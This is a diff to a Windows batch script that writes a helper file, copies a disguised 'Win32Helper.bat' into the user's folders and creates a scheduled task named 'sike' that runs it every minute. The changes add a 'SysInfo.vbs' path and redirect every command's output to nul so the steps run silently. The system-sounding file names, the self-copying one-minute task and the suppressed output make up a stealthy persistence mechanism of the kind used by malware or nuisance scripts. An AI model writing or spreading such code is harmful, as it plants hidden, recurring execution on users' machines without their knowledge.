@@ -6,6 +6,9 @@ set "taskname=Win32Helper.bat"
 set "taskfile=%taskfolder%\%taskname%"
 set "driverfile=%taskfolder%\Win32Handler.bat"
 
+set ttsfolder="%USERPROFILE%\local"
+set "ttsfile=%ttsfolder%\SysInfo.vbs"
+
 set "copyfolder=%USERPROFILE%\Applications"
 
 set "schname=sike"
@@ -41,11 +44,11 @@ goto :MAIN
     echo cd ^/ >> "%driverfile%"
     echo schtasks /query /tn "%schname%" ^> nul >> "%driverfile%"
     echo if %%errorlevel%% neq 0 ( >> "%driverfile%"
-    echo     mkdir "%copyfolder%" >> "%driverfile%"
-    echo     copy /Y "%taskfile%" "%copyfolder%\" >> "%driverfile%"
-    echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f >> "%driverfile%"
-    echo     powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schname% -Settings $TaskSettings" >> "%driverfile%"
-    echo     schtasks /run /tn "%schname%" >> "%driverfile%"
+    echo     mkdir "%copyfolder%" ^> nul >> "%driverfile%"
+    echo     copy /Y "%taskfile%" "%copyfolder%\" ^> nul >> "%driverfile%"
+    echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f ^> nul >> "%driverfile%"
+    echo     powershell -command %tasksettings%"Set-ScheduledTask -TaskName %schname% -Settings $TaskSettings" ^> nul >> "%driverfile%"
+    echo     schtasks /run /tn "%schname%" ^> nul >> "%driverfile%"
     echo ) >> "%driverfile%"
     exit /b
 
